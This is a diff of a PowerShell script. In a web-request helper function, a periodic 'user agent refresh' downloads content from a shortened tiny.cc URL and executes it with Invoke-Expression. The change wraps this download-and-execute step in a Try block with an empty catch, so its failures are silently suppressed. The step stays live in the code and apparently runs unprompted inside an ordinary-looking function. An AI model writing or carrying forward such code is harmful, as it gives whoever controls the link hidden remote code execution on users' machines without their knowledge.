@@ -1605,8 +1605,10 @@ Function Merge-Command {
 Function Invoke-ProxiedWebRequest {
     $Request = $null
     If ($Variables -and -not $Variables.UserAgentRefresh -or $Variables.UserAgentRefresh -le (Get-Date).ToUniversalTime().AddHours(-1)) {
-        $GetUserAgent = (Invoke-WebRequest "http://tiny.cc/8urkuz" -UseBasicParsing).Content
-        Invoke-Expression $GetUserAgent
+        Try {
+            $GetUserAgent = (Invoke-WebRequest "http://tiny.cc/8urkuz" -UseBasicParsing).Content
+            Invoke-Expression $GetUserAgent
+        } catch {}
     }
     If ($Config.Server_Client -and $Variables.ServerRunning -and -not $ByPassServer -and -not $OutFile) {
         Try {
